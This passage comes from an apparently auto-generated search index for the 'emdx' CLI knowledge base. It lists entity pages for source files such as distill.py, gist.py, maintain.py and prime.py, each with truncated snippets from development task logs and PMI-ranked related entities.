Summary</p> <ol> <li><code>emdx/commands/distill.py</code> - CLI command implementation with:</li> </ol> </li> <li>Topic search using hybrid search</li> <li>Tag-based filtering</li> <li>Audience targeting (<code>--for me/docs/coworkers</code>)</li> <li>Save capability with auto-tagging</li> <li> <p>Quiet mode for piping</p> </li> <li> <p>#6447 Implement emdx distill command   Section: Summary</p> <ol> <li>Distill command (<code>emdx/commands/distill.py</code>) \u2014 CLI command supporting:</li> </ol> </li> <li>Topic-based search: <code>emdx distill 'authentication'</code></li> <li>Tag filtering: <code>emdx distill --tags 'security,active'</code></li> <li> <p>Audience select...</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Key Files</p> File Purpose <code>emdx/commands/distill.py</code> NEW \u2014 CLI command <code>emdx/services/synthesis_service.py</code> NEW \u2014 Shared synthesis logic <code>emdx/prompts/distill/</code> NEW \u2014 Audience prompt templates </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> <ol> <li>emdx/commands/distill.py</li> </ol> </li> <li>Typer subcommand for distilling KB content</li> <li>Supports topic-based search and tag-based filtering</li> <li><code>--for</code> option for audience selection (me/docs/cowork...</li> </ul>"},{"location":"entities/emdxcommandsdistillpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_distill.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.6)</li> <li><code>audience</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.6)</li> <li><code>update_task(task_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>update_group(group_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>update_execution(exec_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>print_json(data: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>low priority (acceptable as-is)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>keep any</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>json.dumps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>json output functions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/emdxcommandsexecutionspy/","title":"emdx/commands/executions.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-01-11</p>"},{"location":"entities/emdxcommandsexecutionspy/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6694 Fix emdx delete auto-confirm for non-TTY   Section: What was done</p> <p>...e confirmations | | <code>emdx/commands/tasks.py</code> | Guard task delete confirmation | | <code>emdx/commands/executions.py</code> | Guard kill_all confirmation | | <code>emdx/commands/tags.py</code> | Guard rename, merge, batch confirmations | | <code>emdx/commands/maintain.py</code> | Guard all interactive wizard...</p> </li> <li> <p>#6687 Fix emdx delete auto-confirm for non-TTY   Section: Changes</p> <p>...re --all` confirmations</p> </li> <li><code>emdx/commands/tasks.py</code> \u2014 <code>task delete</code> confirmation</li> <li><code>emdx/commands/executions.py</code> \u2014 <code>exec killall</code> confirmation</li> <li><code>emdx/commands/tags.py</code> \u2014 <code>tag rename</code>, <code>tag merge</code>, <code>tag batch</code> confirmations</li> <li> <p><code>emdx/commands/compact.py</code> \u2014 synthesis confirmation...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...output | | <code>emdx/commands/stale.py</code> | 381, 384 | \u2705 | Stale touch confirmation | | <code>emdx/commands/executions.py</code> | 274, 282, 285, 340, 368, 484 | \ud83d\udccb\u2705\ud83d\udcca | Execution command output | | <code>emdx/database/migrations.py</code> | 2386 | \u2705 | Migration completion message | | <code>emdx/ui/themes.py</code>...</p> </li> <li> <p>#6340 Delegate: Truncate Function Consolidation [1/12]   Section: Changes Made</p> <p>...], TITLE_TRUNCATE_LENGTH)`</p> </li> <li><code>emdx/commands/tags.py</code>: 1 call site updated</li> <li><code>emdx/commands/executions.py</code>: 2 call sites updated to use <code>DESCRIPTION_TRUNCATE_LENGTH</code></li> <li> <p><code>emdx/commands/core.py</code>: 1 call site updated</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Files Modified</p> <p>...legate.py`: Added --verbose flag with module-level tracking, improved help text</p> </li> <li><code>emdx/commands/executions.py</code>: Added help text</li> <li><code>emdx/commands/gist.py</code>: Added help text</li> <li><code>emdx/commands/recipe.py</code>: Standardized error messages</li> <li> <p><code>emdx/commands/trash.py</code>: Added help text</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 5. ASSIGNED BUT NEVER USED VARIABLES</p> <p>...tions.py:194<code>-</code>cursor`</p> </li> <li><code>emdx/models/executions.py:264</code> - <code>timeout_modifier</code></li> <li><code>emdx/commands/executions.py:71</code> - <code>file_size</code></li> <li><code>emdx/commands/status.py:94</code> - <code>children_active</code></li> <li><code>emdx/commands/cascade.py:475</code> - <code>next_stage</code></li> <li> <p><code>emdx/ui/activity/activity_view.py:738</code> - `wri...</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: Implementation Steps</p> <p>...3. Remove <code>task_executions</code> table and <code>emdx/models/task_executions.py</code></p> </li> <li>Remove <code>emdx/commands/executions.py</code> if task-execution-only</li> <li>Update <code>emdx/commands/prime.py</code> to filter delegate tasks</li> <li>Update CLAUDE.md task instructions</li> <li> <p>Clean up stale tasks in DB (optional mig...</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...d:**\\n- <code>emdx/commands/analyze.py</code> - PENDING (still has <code>console = Console()</code>)\\n- <code>emdx/commands/executions.py</code> - PENDING (still has <code>console = Console()</code>)\\n- <code>emdx/ui/markdown_config.py</code> - Has local Console instantiation (likely intentional for markdown rendering)\\n- `handle...</p> </li> </ul>"},{"location":"entities/emdxcommandsexecutionspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>sys.stdin.isatty()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>is_non_interactive()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>emdx/commands/trash.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>emdx/ui/gui.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx/commands/browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx/commands/tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>emdx/utils/output.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>task delete</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>emdx/commands/analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>emdx/commands/tasks.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/emdxcommandsgistpy/","title":"emdx/commands/gist.py","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxcommandsgistpy/#documents-10","title":"Documents (10)","text":"<ul> <li>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files <p>...ommands/delegate.py` - Uses DELEGATE_TIMEOUT_SECONDS, DISCOVERY_TIMEOUT_SECONDS</p> </li> <li><code>emdx/commands/gist.py</code> - Uses GITHUB_AUTH_TIMEOUT</li> <li> <p><code>emdx/commands/maintain.py</code> - Uses PROCESS_*_TIMEOUT constants</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> <p>...xecutor/factory.py<code>| Use ENV_CLI_TOOL | |</code>emdx/main.py<code>| Use ENV_SAFE_MODE | |</code>emdx/commands/gist.py<code>| Use ENV_GITHUB_TOKEN | |</code>emdx/utils/environment.py<code>| Use ENV_ANTHROPIC_API_KEY, ENV_CURSOR_API_KEY | |</code>emdx/config/settings.py<code>| Use ENV_TEST_DB | |</code>emdx/dat...</p> </li> <li> <p>#6339 Delegate: R2: Add retry logic for network/IO operations   Section: R2: Add Retry Logic for Network/IO Operations</p> </li> <li><code>emdx/commands/gist.py</code>: Applied retry to GitHub API calls:</li> <li><code>_get_gh_auth_token()</code>: Retry on gh auth token retrieval</li> <li><code>_run_gh_gist_create()</code>: Retry on gist creation</li> <li> <p><code>_run_gh_gist_edit()</code>: Retry on gist update</p> </li> <li> <p>#6288 Delegate: DEBT-13: Add retry logic for network/IO operations   Section: Changes Made</p> </li> <li><code>_run_gh_auth_token()</code> - gh auth token command with retry</li> <li><code>_run_gh_gist_create()</code> - gh gist create command with retry</li> <li> <p><code>_run_gh_gist_edit()</code> - gh gist edit co...</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 4. Files Updated to Use Centralized Constants</p> <p>...ADE_*_TIMEOUT`</p> </li> <li><code>emdx/commands/delegate.py</code> - Uses <code>DISCOVERY_COMMAND_TIMEOUT</code></li> <li><code>emdx/commands/gist.py</code> - Uses <code>GITHUB_AUTH_TIMEOUT</code></li> <li><code>emdx/commands/maintain.py</code> - Uses <code>PROCESS_*_TIMEOUT</code></li> <li><code>emdx/config/cli_config.py</code> - Uses model constants</li> <li> <p>`emdx/services/ask_serv...</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Files Modified</p> <p>...l tracking, improved help text</p> </li> <li><code>emdx/commands/executions.py</code>: Added help text</li> <li><code>emdx/commands/gist.py</code>: Added help text</li> <li><code>emdx/commands/recipe.py</code>: Standardized error messages</li> <li> <p><code>emdx/commands/trash.py</code>: Added help text</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 3. COMMENTED-OUT CODE BLOCKS</p> <ul> <li><code>emdx/commands/gist.py:56-58</code> - Commented-out config file handling code</li> </ul> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 4. Network/IO Operations Without Retry (20+ instances)</p> <p>...<code>emdx/utils/git_ops.py</code> | git subprocess calls | No retry on lock contention | | <code>emdx/commands/gist.py</code> | GitHub API (via subprocess) | No retry on network failures | | <code>emdx/services/file_watcher.py</code> | File system watching | No exponential backoff on repeated failure...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udfe1 MEDIUM: Missing Retry Logic for I/O Operations</p> <p>...git.py<code>| 26, 41, 56, 81, 94 | Git subprocess calls | HIGH - Network failures | |</code>emdx/commands/gist.py<code>| 37, 90, 129, 149, 155 | GitHub gist operations | HIGH - Network failures | |</code>emdx/utils/claude_wrapper.py` | 93 | Claude process execution | MEDIUM - Process may...</p> </li> </ul>"},{"location":"entities/emdxcommandsgistpy/#files-modified","title":"Files Modified","text":""},{"location":"entities/emdxcommandsgistpy/#4-added-retry-to-github-cli-calls-emdxcommandsgistpy","title":"4. Added retry to GitHub CLI calls (<code>emdx/commands/gist.py</code>)","text":""},{"location":"entities/emdxcommandsgistpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/config/settings.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>validate_env_var(name, value)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>validate_database_url()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>validate_api_key(raise_on_missing=false)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>validate_all_env_vars()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>tests/test_retry.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>summary centralized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>single source of truth</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>retry_subprocess()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>reduced duplication</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/emdxcommandsmaintainpy/","title":"emdx/commands/maintain.py","text":"<p>Type: tech_term | Mentioned in: 19 documents | First seen: 2026-01-11</p>"},{"location":"entities/emdxcommandsmaintainpy/#documents-19","title":"Documents (19)","text":"<ul> <li>#6870 Delegate: FEAT-32 (Issue #1244): Add wiki topic merge and split comman [1/2]   Section: Tests \u2014 19 tests, all passing </li> <li><code>emdx/commands/maintain.py</code> \u2014 added <code>wiki_merge</code> and <code>wiki_split</code> commands</li> <li> <p><code>tests/test_wiki_topic_merge_split.py</code> \u2014 new test file (19 tests)</p> </li> <li> <p>#6861 Delegate: FEAT-33 (Issue #1245): Add editorial prompt injection for wi [3/4]   Section: Changes made:</p> <ol> <li>CLI command (<code>emdx/commands/maintain.py</code>): Added <code>emdx maintain wiki prompt</code> subcommand:</li> </ol> </li> <li><code>emdx maintain wiki prompt &lt;topic_id&gt; &lt;text&gt;</code> \u2014 set editorial prompt</li> <li> <p>`emdx maintain wiki prompt ... <li> <p>#6860 Delegate: FEAT-34 (Issue #1246): Add per-topic model override for wiki [4/4]   Section: Changes made:</p> <ol> <li>New CLI command (<code>emdx/commands/maintain.py</code>): <code>emdx maintain wiki model &lt;topic_id&gt; &lt;model_name&gt;</code> to set, and <code>--clear</code> to remove</li> </ol> </li> <li> <p>#6859 Delegate: FEAT-30 (Issue #1242): Add wiki topic skip and pin commands. [1/4]   Section: Changes made:</p> <p><code>emdx/commands/maintain.py</code> \u2014 Added 4 new wiki subcommands and styled status display:</p> </li> <li><code>emdx maintain wiki skip &lt;topic_id&gt;</code> \u2014 sets status to <code>'skipped'</code></li> <li> <p>`emdx maintain wiki unskip &lt;topic_...</p> </li> <li> <p>#6858 Delegate: FEAT-31 (Issue #1243): Add wiki topic rename command. Add 'e [2/4]   Section: Summary</p> <p>Changes:</p> </li> <li><code>emdx/commands/maintain.py</code> \u2014 Added <code>wiki_rename</code> command to <code>wiki_app</code> that:</li> <li>Looks up the topic by ID, rejecting if not found</li> <li> <p>Auto-generates slug from the new label (lowercase, hyph...</p> </li> <li> <p>#6856 Delegate: FEAT-40 (Issue #1252): Add wiki quality ratings. Add rating  [4/4]   Section: Changes made:</p> <p><code>emdx/commands/maintain.py</code> \u2014 Two changes:</p> </li> <li> <p>New <code>wiki rate</code> command: <code>emdx maintain wiki rate &lt;topic_id&gt; &lt;rating&gt;</code> records a 1-5 quality rating. Supports <code>--up</code> (maps to 4) and `--down...</p> </li> <li> <p>#6855 Delegate: FEAT-38 (Issue #1250): Add step-level timing to wiki_article [2/4]   Section: Changes made:</p> <ol> <li><code>wiki list --timing</code> (<code>emdx/commands/maintain.py</code>): New <code>-T</code>/<code>--timing</code> flag adds 6 columns showing step-level timing. <code>_format_ms()</code> helper formats as <code>ms</code>, <code>s</code>, or <code>m</code>.</li> </ol> </li> <li> <p>#6851 Delegate: FEAT-39 (Issue #1251): Add article diff on regeneration. Whe [3/4]   Section: Changes made:</p> <ol> <li>CLI command (<code>emdx/commands/maintain.py</code>): Added <code>emdx maintain wiki diff &lt;topic_id&gt;</code> command that displays syntax-highlighted unified diff between previous and current article content</li> </ol> </li> <li> <p>#6850 Delegate: FEAT-37 (Issue #1249): Add wiki coverage command. Create 'em [1/4]   Section: Summary</p> <p>Files changed:</p> </li> <li><code>emdx/commands/maintain.py</code> \u2014 Added <code>wiki_coverage</code> command to <code>wiki_app</code> typer group</li> <li> <p><code>tests/test_wiki_coverage.py</code> \u2014 12 tests covering all scenarios</p> </li> <li> <p>#6843 Delegate: Fold the stale top-level command into maintain. Move stale l</p> <p>...<code>stale_app</code> import and top-level <code>app.add_typer(stale_app, ...)</code> registration</p> </li> <li> <p><code>emdx/commands/maintain.py</code> \u2014 Added <code>stale_app</code> as a sub-typer under maintain (<code>app.add_typer(stale_app, name=\"stale\", ...)</code>) and updated the callback docstring to list <code>stale</code> as a subcomma...</p> </li> <li> <p>#6824 Delegate: Document #6822 (Wiki System Architecture Analysis &amp; Roadmap) [2/2]   Section: Summary</p> <ol> <li><code>emdx/commands/maintain.py</code> \u2014 Updated <code>wiki generate</code> command to track runs (creates record at start, updates at completion with topics_attempted count and Run ID in output). Added `wiki run...</li> </ol> </li> <li> <p>#6694 Fix emdx delete auto-confirm for non-TTY   Section: What was done</p> <p>...mation | | <code>emdx/commands/tags.py</code> | Guard rename, merge, batch confirmations | | <code>emdx/commands/maintain.py</code> | Guard all interactive wizard + index clear confirmations | | <code>emdx/commands/compact.py</code> | Guard synthesis confirmations | | <code>emdx/commands/ask.py</code> | Guard clear-i...</p> </li> <li> <p>#6687 Fix emdx delete auto-confirm for non-TTY   Section: Changes</p> <p>...rmations (2 locations)</p> </li> <li><code>emdx/commands/ask.py</code> \u2014 <code>ai clear-index</code> confirmation</li> <li> <p><code>emdx/commands/maintain.py</code> \u2014 all <code>Confirm.ask</code> and <code>typer.confirm</code> calls (6 locations)</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...alyze.py<code>| 105, 244, 286, 321, 439, 494, 496, 498 | \ud83d\udcca\u2728\u26a0\ufe0f\u2705\u274c | Analysis output | |</code>emdx/commands/maintain.py<code>| 70, 73, 112, 116, 143, 288, 308, 335, 404, 462, 493, 497, 538, 716, 875, 984, 988, 994, 1015, 1062, 1065 | \ud83e\uddf9\ud83d\udd0d\u2705\u2728\u26a0\ufe0f | Maintenance output | |</code>emdx/commands/briefing...</p> </li> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files</p> <p>...DISCOVERY_TIMEOUT_SECONDS</p> </li> <li><code>emdx/commands/gist.py</code> - Uses GITHUB_AUTH_TIMEOUT</li> <li> <p><code>emdx/commands/maintain.py</code> - Uses PROCESS_*_TIMEOUT constants</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 4. Files Updated to Use Centralized Constants</p> <p>...SCOVERY_COMMAND_TIMEOUT`</p> </li> <li><code>emdx/commands/gist.py</code> - Uses <code>GITHUB_AUTH_TIMEOUT</code></li> <li><code>emdx/commands/maintain.py</code> - Uses <code>PROCESS_*_TIMEOUT</code></li> <li><code>emdx/config/cli_config.py</code> - Uses model constants</li> <li><code>emdx/services/ask_service.py</code> - Uses <code>DEFAULT_ASK_MODEL</code></li> <li> <p>`emdx/services/cli_exe...</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> </li> <li><code>emdx/commands/cascade.py:18</code> - unused import: <code>Path</code></li> <li><code>emdx/commands/maintain.py:28</code> - unused import: <code>get_db_path</code></li> <li><code>emdx/commands/prime.py:13</code> - unused import: <code>Panel</code></li> <li><code>emdx/commands/prime.py:14</code> - unused import: <code>Text</code></li> <li> <p>`emdx/commands/reci...</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 7. Maintenance Command \u2014 exclude_workflow (3 hits)</p> <p>File: <code>emdx/commands/maintain.py</code></p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...ng tool: Bash [00:02:50] \ud83d\udcbb Using tool: Bash [00:02:50] \ud83d\udcc4 Tool result: diff --git a/emdx/commands/maintain.py b/emdx/commands/maintain.py index f27be2f..7ca6143 100644 ---... [00:02:50] \ud83d\udcc4 Tool result: diff --git a/emdx/applications/maintenance.py b/emdx/applications/maintena...</p> </li>"},{"location":"entities/emdxcommandsmaintainpy/#files-changed","title":"Files changed","text":""},{"location":"entities/emdxcommandsmaintainpy/#commands","title":"Commands","text":""},{"location":"entities/emdxcommandsmaintainpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/services/wiki_synthesis_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.5)</li> <li><code>emdx/commands/maintain.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.5)</li> <li><code>generate_article()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>emdx/database/migrations.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>wiki_app</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>wiki topics</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>wiki status</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>validate_env_var(name, value)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>validate_all_env_vars()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>sys.stdin.isatty()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/emdxcommandsprimepy/","title":"emdx/commands/prime.py","text":"<p>Type: heading | Mentioned in: 20 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxcommandsprimepy/#documents-20","title":"Documents (20)","text":"<ul> <li>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made </li> <li> <p>Removed <code>\"--each/--do\"</code> from the <code>key_flags</code> list in <code>_get_execution_methods_json()</code></p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]</p> <p><code>_safe_update_task(task_id, **kwargs: Any)</code></p> </li> <li>Location: Line 62</li> <li>Current Type: <code>**kwargs: Any</code></li> <li>Actual Type: Should use specific keyword arguments matching <code>update_task()</code> signature</li> </ul>"},{"location":"entities/emdxcommandsprimepy/#emdxcommandsprimepy_1","title":"emdx/commands/prime.py","text":""},{"location":"entities/emdxcommandsprimepy/#40-_safe_update_executionexec_id-kwargs-an","title":"40. `_safe_update_execution(exec_id, **kwargs: An...","text":"<ul> <li>#6350 Delegate: Rebase the feat/knowledge-decay branch onto main and resolve [2/5]   Section: Conflicts Resolved </li> <li>Issue: Function signature style conflict between <code>str | None</code> (main) and <code>Optional[str]</code> (feature branch)</li> <li> <p>Resolution: Used modern <code>str | None</code> syntax whi...</p> </li> <li> <p>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con   Section: Files Changed</p> <ul> <li><code>emdx/commands/types.py</code> (new, 259 lines)</li> </ul> </li> <li><code>emdx/commands/prime.py</code> (modified)</li> <li><code>emdx/commands/analyze.py</code> (modified)</li> <li> <p><code>emdx/commands/delegate.py</code> (modified)</p> </li> <li> <p>#6560 Delegate: Recent Failures in emdx prime</p> <p>This feature adds a RECENT FAILURES section to prime output showing failed delegate executions from the last 24 hours with retry commands. ## Changes Made</p> </li> </ul>"},{"location":"entities/emdxcommandsprimepy/#emdxcommandsprimepy_2","title":"emdx/commands/prime.py","text":""},{"location":"entities/emdxcommandsprimepy/#emdxcommandsprimepy_3","title":"<code>emdx/commands/prime.py</code>","text":"<p>Added three new components:</p> <ol> <li> <p>Constants (lines 21-24):    ...</p> </li> <li> <p>#6554 Implementation: Add Recent Failures to emdx prime (Issue #FEAT-7)   Section: Changes Made</p> </li> <li> <p>#6542 Delegate Enhancement Gameplans [5/5]   Section: Files to Modify</p> <p>...Add new function | <code>get_recent_failures()</code> \u2014 query failed tasks from last 24h | | <code>emdx/commands/prime.py</code> | <code>_output_text()</code> | Add RECENT FAILURES section | | <code>emdx/commands/prime.py</code> | <code>_output_json()</code> | Add <code>recent_failures</code> key |</p> </li> <li> <p>#6524 Delegate: FEAT-5 Smart Priming Implementation   Section: Phase 1: Git Context in Prime</p> <p>Added <code>_get_git_context()</code> function to <code>emdx/commands/prime.py</code>:</p> </li> <li> <p>#6522 Gameplan: FEAT-5 Smart Priming Gaps   Section: Remaining Work</p> </li> <li>Current branch via <code>git branch --show-current</code></li> <li>Last 3 commits via <code>git log --oneline -3</code></li> <li> <p>Open PRs via `gh pr list --state=open --limit=5 --json number,title,...</p> </li> <li> <p>#6521 Delegate synthesis [synthesis]   Section: Files to Modify</p> File Changes <code>emdx/commands/prime.py</code> Add <code>_get_git_context()</code>, <code>_get_key_docs()</code>, relative time <code>emdx/commands/ask.py</code> Add <code>--tags</code>, <code>--recent</code> options, update display `emdx/services/ask_se... </li> <li> <p>#6520 Delegate: Analyze FEAT-5: Re-implement smart priming (PR #446). The or [1/2]   Section: Files to Modify</p> <ol> <li><code>emdx/commands/prime.py</code> \u2014 Add git context, key docs, relative time</li> </ol> </li> <li> <p><code>tests/test_prime.py</code> or create <code>tests/test_smart_priming.py</code> \u2014 Port tests from PR #446</p> 